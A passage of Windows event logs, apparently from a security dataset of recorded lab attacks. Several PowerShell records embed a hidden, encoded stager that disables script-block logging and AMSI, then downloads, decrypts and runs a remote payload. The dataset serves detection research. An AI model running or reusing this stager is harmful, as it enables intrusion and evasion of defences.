{"Version":1,"AccountType":"User","Domain":"THESHIRE","ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.18362.752\r\n        Host ID = 5e60cc9d-d63a-4599-90d3-47e5ecc63e1b\r\n        Host Application = C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Win Hidden -enc SQBGACgAJABQAFMAVgBFAFIAUwBpAG8AbgBUAEEAQgBsAEUALgBQAFMAVgBFAFIAUwBJAG8ATgAuAE0AQQBqAE8AcgAgAC0AZwBlACAAMwApAHsAJAA2ADgANgA2AD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBNAEIATABZAC4ARwBFAFQAVAB5AFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYAaQBFAGAAbABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADYAOAA2ADYAKQB7ACQAMQBmAEUANwA9ACQANgA4ADYANgAuAEcARQBUAFYAYQBsAFUAZQAoACQAbgBVAEwATAApADsASQBmACgAJAAxAEYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAMQBGAGUANwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAxAGYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAGwAPQBbAEMATwBsAEwARQBjAFQASQBvAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBEAGkAQwBUAGkAbwBuAEEAcgB5AFsAcwB0AFIAaQBOAGcALABTAFkAcwB0AEUAbQAuAE8AYgBqAGUAQwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAGEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEAbAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADEARgBFADcAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAGwAfQBFAGwAcwBlAHsAWwBTAGMAcgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBlAFQARgBpAEUAYABsAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBsAFUARQAoACQAbgBVAEwATAAsACgATgBlAHcALQBPAEIASgBlAGMAdAAgAEMAbwBsAEwAZQBjAHQAaQBPAG4AcwAuAEcAZQBuAEUAUgBJAGMALgBIAEEAcwBIAFMARQBUAFsAUwB0AFIASQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUARgBdAC4AQQBzAFMARQBtAEIATABZAC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkARQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQATgB1AGwAbAAsACQAdABSAFUAZQApADsAfQA7AFsAUwBZAHMAdABFAG0ALgBOAGUAVAAuAFMARQByAHYASQBjAGUAUABvAEkATgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQBYAFAAZQBjAHQAMQAwADAAQwBvAG4AdABpAE4AVQBFAD0AMAA7ACQARgA5ADQAZQA9AE4ARQB3AC0ATwBCAEoARQBjAHQAIABTAFkAUwB0AEUATQAuAE4AZQB0AC4AVwBFAGIAQwBsAGkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAE4AYwBvAEQAaQBOAEcAXQA6ADoAVQBOAGkAQwBPAGQARQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBDAE8AbgBWAGUAcgBUAF0AOgA6AEYAUgBPAE0AQgBhAHMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAGYAOQA0AEUALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABGADkANABFAC4AUAByAG8AeAB5AD0AWwBTAFkAcwB0AGUAbQAuAE4ARQBUAC4AVwBFAGIAUgBFAFEAdQBlAFMAdABdADoAOgBEAEUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAWQA7ACQARgA5ADQARQAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBOAHQAaQBhAGwAcwAgAD0AIABbAFMAWQBzAHQAZQBtAC4ATgBlAHQALgBDAFIARQBEAEUAbgBUAEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAGUARgBhAFUATAB0AE4AZQB0AFcATwBSAEsAQwByAGUARABFAE4AVABJAEEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGYAOQA0AGUALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAE8ARABpAG4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAdABCAFkAVABlAFMAKAAnAD4AaQBeAEwAfgBmACUAeQBbACgAUgBwADAAbgBkAGoALwBQADwASgBrADMAPQBoAEgAcQBlAHQARQA/ADYALQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAGYAOQA0AGUALgBIAEUAYQBkAGUAcgBTAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAEcAQgBmAFIAYgBIAGMAcABjAHcAdgA9AGwAVwBsAEMAZwBrAHMAeQBMADMAUAB4AEwAcABBAHkARwB4AEYASQBqAFYATABYADQAMABBAD0AIgApADsAJABEAGEAVABBAD0AJABmADkANABFAC4ARABPAFcATgBsAE8AQQBEAEQAYQBUAGEAKAAkAHMARQBSACsAJAB0ACkAOwAkAGkAdgA9ACQARABBAFQAYQBbADAALgAuADMAXQA7ACQAZABBAFQAQQA9ACQAZABhAHQAYQBbADQALgAuACQAZABBAHQAYQAuAGwAZQBOAEcAdABIAF0AOwAtAEoATwBpAE4AWwBDAEgAYQBSAFsAXQBdACgAJgAgACQAUgAgACQARABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 0fd2189f-3371-4502-9a40-5e8afb4bf73d\r\n        Pipeline ID = 1\r\n        Command Name = ForEach-Object\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 3002\r\n        User = THESHIRE\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","Opcode":"To be used when operation is just executing a method","UserID":"S-1-5-21-3125456671-949036322-3048627137-1104","SourceName":"Microsoft-Windows-PowerShell","Hostname":"WORKSTATION5.theshire.local","ActivityID":"{245D3B9B-5E92-0000-8559-D9128A82D601}","EventType":"INFO","ThreadID":1600,"RecordNumber":3542,"SeverityValue":2,"SourceModuleName":"eventlog","Keywords":0,"Severity":"INFO","OpcodeValue":20,"AccountName":"pgustavo","host":"wec.internal.cloudapp.net","EventID":4103,"ERROR_EVT_UNRESOLVED":true,"port":53971,"@version":"1","Category":"Executing Pipeline","EventReceivedTime":"2020-09-04 03:29:48","Task":106,"Payload":"CommandInvocation(ForEach-Object): \"ForEach-Object\"\r\nParameterBinding(ForEach-Object): name=\"Process\"; value=\"$f94e.Headers.Add($_.Name, $_.Value)\"\r\n","EventTime":"2020-09-04 03:29:46","Channel":"Microsoft-Windows-PowerShell/Operational","@timestamp":"2020-09-04T07:29:48.616Z","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","ExecutionProcessID":1376,"SourceModuleType":"im_msvistalog","tags":["mordorDataset"]}
{"Version":3,"Message":"Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-09-04 07:29:46.121\r\nSourceProcessGUID: {3ddc5665-e7cc-5f51-1000-000000000500}\r\nSourceProcessId: 916\r\nSourceThreadId: 448\r\nSourceImage: C:\\windows\\system32\\svchost.exe\r\nTargetProcessGUID: {3ddc5665-e7d0-5f51-5100-000000000500}\r\nTargetProcessId: 3268\r\nTargetImage: C:\\windows\\System32\\svchost.exe\r\nGrantedAccess: 0x1000\r\nCallTrace: C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","SourceThreadId":"448","TargetImage":"C:\\windows\\System32\\svchost.exe","Domain":"NT AUTHORITY","TargetProcessGUID":"{3ddc5665-e7d0-5f51-5100-000000000500}","UserID":"S-1-5-18","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","SourceProcessGUID":"{3ddc5665-e7cc-5f51-1000-000000000500}","Keywords":-9223372036854775808,"AccountName":"SYSTEM","EventID":10,"ProcessId":"916","Channel":"Microsoft-Windows-Sysmon/Operational","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"SourceModuleType":"im_msvistalog","TargetProcessId":"3268","AccountType":"User","SourceImage":"C:\\windows\\system32\\svchost.exe","Opcode":"Info","SourceName":"Microsoft-Windows-Sysmon","ThreadID":4344,"RecordNumber":309435,"SeverityValue":2,"SourceModuleName":"eventlog","Severity":"INFO","OpcodeValue":0,"host":"wec.internal.cloudapp.net","port":53971,"@version":"1","Category":"Process accessed (rule: ProcessAccess)","GrantedAccess":"0x1000","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","Task":10,"UtcTime":"2020-09-04 07:29:46.121","EventTime":"2020-09-04 03:29:46","EventReceivedTime":"2020-09-04 03:29:48","@timestamp":"2020-09-04T07:29:48.617Z","tags":["mordorDataset"],"RuleName":"-","SourceProcessId":"916"}
{"Version":1,"AccountType":"User","Domain":"THESHIRE","ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.18362.752\r\n        Host ID = 5e60cc9d-d63a-4599-90d3-47e5ecc63e1b\r\n        Host Application = C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Win Hidden -enc SQBGACgAJABQAFMAVgBFAFIAUwBpAG8AbgBUAEEAQgBsAEUALgBQAFMAVgBFAFIAUwBJAG8ATgAuAE0AQQBqAE8AcgAgAC0AZwBlACAAMwApAHsAJAA2ADgANgA2AD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBNAEIATABZAC4ARwBFAFQAVAB5AFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYAaQBFAGAAbABEACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADYAOAA2ADYAKQB7ACQAMQBmAEUANwA9ACQANgA4ADYANgAuAEcARQBUAFYAYQBsAFUAZQAoACQAbgBVAEwATAApADsASQBmACgAJAAxAEYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAMQBGAGUANwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAxAGYAZQA3AFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAGwAPQBbAEMATwBsAEwARQBjAFQASQBvAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBEAGkAQwBUAGkAbwBuAEEAcgB5AFsAcwB0AFIAaQBOAGcALABTAFkAcwB0AEUAbQAuAE8AYgBqAGUAQwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAGEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEAbAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADEARgBFADcAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAGwAfQBFAGwAcwBlAHsAWwBTAGMAcgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBlAFQARgBpAEUAYABsAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBsAFUARQAoACQAbgBVAEwATAAsACgATgBlAHcALQBPAEIASgBlAGMAdAAgAEMAbwBsAEwAZQBjAHQAaQBPAG4AcwAuAEcAZQBuAEUAUgBJAGMALgBIAEEAcwBIAFMARQBUAFsAUwB0AFIASQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUARgBdAC4AQQBzAFMARQBtAEIATABZAC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkARQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQATgB1AGwAbAAsACQAdABSAFUAZQApADsAfQA7AFsAUwBZAHMAdABFAG0ALgBOAGUAVAAuAFMARQByAHYASQBjAGUAUABvAEkATgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQBYAFAAZQBjAHQAMQAwADAAQwBvAG4AdABpAE4AVQBFAD0AMAA7ACQARgA5ADQAZQA9AE4ARQB3AC0ATwBCAEoARQBjAHQAIABTAFkAUwB0AEUATQAuAE4AZQB0AC4AVwBFAGIAQwBsAGkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAE4AYwBvAEQAaQBOAEcAXQA6ADoAVQBOAGkAQwBPAGQARQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBDAE8AbgBWAGUAcgBUAF0AOgA6AEYAUgBPAE0AQgBhAHMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAGYAOQA0AEUALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABGADkANABFAC4AUAByAG8AeAB5AD0AWwBTAFkAcwB0AGUAbQAuAE4ARQBUAC4AVwBFAGIAUgBFAFEAdQBlAFMAdABdADoAOgBEAEUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAWQA7ACQARgA5ADQARQAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBOAHQAaQBhAGwAcwAgAD0AIABbAFMAWQBzAHQAZQBtAC4ATgBlAHQALgBDAFIARQBEAEUAbgBUAEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAGUARgBhAFUATAB0AE4AZQB0AFcATwBSAEsAQwByAGUARABFAE4AVABJAEEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGYAOQA0AGUALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAE8ARABpAG4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAdABCAFkAVABlAFMAKAAnAD4AaQBeAEwAfgBmACUAeQBbACgAUgBwADAAbgBkAGoALwBQADwASgBrADMAPQBoAEgAcQBlAHQARQA/ADYALQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAGYAOQA0AGUALgBIAEUAYQBkAGUAcgBTAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAEcAQgBmAFIAYgBIAGMAcABjAHcAdgA9AGwAVwBsAEMAZwBrAHMAeQBMADMAUAB4AEwAcABBAHkARwB4AEYASQBqAFYATABYADQAMABBAD0AIgApADsAJABEAGEAVABBAD0AJABmADkANABFAC4ARABPAFcATgBsAE8AQQBEAEQAYQBUAGEAKAAkAHMARQBSACsAJAB0ACkAOwAkAGkAdgA9ACQARABBAFQAYQBbADAALgAuADMAXQA7ACQAZABBAFQAQQA9ACQAZABhAHQAYQBbADQALgAuACQAZABBAHQAYQAuAGwAZQBOAEcAdABIAF0AOwAtAEoATwBpAE4AWwBDAEgAYQBSAFsAXQBdACgAJgAgACQAUgAgACQARABBAHQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 0fd2189f-3371-4502-9a40-5e8afb4bf73d\r\n        Pipeline ID = 1\r\n        Command Name = Get-Random\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 3004\r\n        User = THESHIRE\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","Opcode":"To be used when operation is just executing a method","UserID":"S-1-5-21-3125456671-949036322-3048627137-1104","SourceName":"Microsoft-Windows-PowerShell","Hostname":"WORKSTATION5.theshire.local","ActivityID":"{245D3B9B-5E92-0000-8659-D9128A82D601}","EventType":"INFO","ThreadID":1600,"RecordNumber":3543,"SeverityValue":2,"SourceModuleName":"eventlog","Keywords":0,"Severity":"INFO","OpcodeValue":20,"AccountName":"pgustavo","host":"wec.internal.cloudapp.net","EventID":4103,"ERROR_EVT_UNRESOLVED":true,"port":53971,"@version":"1","Category":"Executing Pipeline","EventReceivedTime":"2020-09-04 03:29:48","Task":106,"Payload":"CommandInvocation(Get-Random): \"Get-Random\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/admin/get.php\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/news.php\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/login/process.php\"\r\n","EventTime":"2020-09-04 03:29:46","Channel":"Microsoft-Windows-PowerShell/Operational","@timestamp":"2020-09-04T07:29:48.617Z","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","ExecutionProcessID":1376,"SourceModuleType":"im_msvistalog","tags":["mordorDataset"]}
{"Version":3,"Message":"Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-09-04 07:29:46.121\r\nSourceProcessGUID: {3ddc5665-e7cc-5f51-1000-000000000500}\r\nSourceProcessId: 916\r\nSourceThreadId: 7376\r\nSourceImage: C:\\windows\\system32\\svchost.exe\r\nTargetProcessGUID: {3ddc5665-e7d0-5f51-5100-000000000500}\r\nTargetProcessId: 3268\r\nTargetImage: C:\\windows\\System32\\svchost.exe\r\nGrantedAccess: 0x1000\r\nCallTrace: C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","SourceThreadId":"7376","TargetImage":"C:\\windows\\System32\\svchost.exe","Domain":"NT AUTHORITY","TargetProcessGUID":"{3ddc5665-e7d0-5f51-5100-000000000500}","UserID":"S-1-5-18","Hostname":"WORKSTATION5.theshire.local","EventType":"INFO","SourceProcessGUID":"{3ddc5665-e7cc-5f51-1000-000000000500}","Keywords":-9223372036854775808,"AccountName":"SYSTEM","EventID":10,"ProcessId":"916","Channel":"Microsoft-Windows-Sysmon/Operational","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3080,"SourceModuleType":"im_msvistalog","TargetProcessId":"3268","AccountType":"User","SourceImage":"C:\\windows\\system32\\svchost.exe","Opcode":"Info","SourceName":"Microsoft-Windows-Sysmon","ThreadID":4344,"RecordNumber":309436,"SeverityValue":2,"SourceModuleName":"eventlog","Severity":"INFO","OpcodeValue":0,"host":"wec.internal.cloudapp.net","port":53971,"@version":"1","Category":"Process accessed (rule: ProcessAccess)","GrantedAccess":"0x1000","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","Task":10,"UtcTime":"2020-09-04 07:29:46.121","EventTime":"2020-09-04 03:29:46","EventReceivedTime":"2020-09-04 03:29:48","@timestamp":"2020-09-04T07:29:48.618Z","tags":["mordorDataset"],"RuleName":"-","SourceProcessId":"916"}
{"Version":3,"Message":"Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-09-04 07:29:46.121\r\nSourceProcessGUID: {3ddc5665-e7cc-5f51-1000-000000000500}\r\nSourceProcessId: 916\r\nSourceThreadId: 7376\r\nSourceImage: C:\\windows\\system32\\svchost.exe\r\nTargetProcessGUID: {3ddc5665-e7d0-5f51-5100-000000000500}\r\nTargetProcessId: 3268\r\nTargetImage: C:\\windows\\System32\\svchost.exe\r\nGrantedAccess: 0x1000\r\nCallTrace: C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","SourceThreadId":"7376","TargetImage":"C:\\windows\\System32\\svchost.exe","Domain":"NT 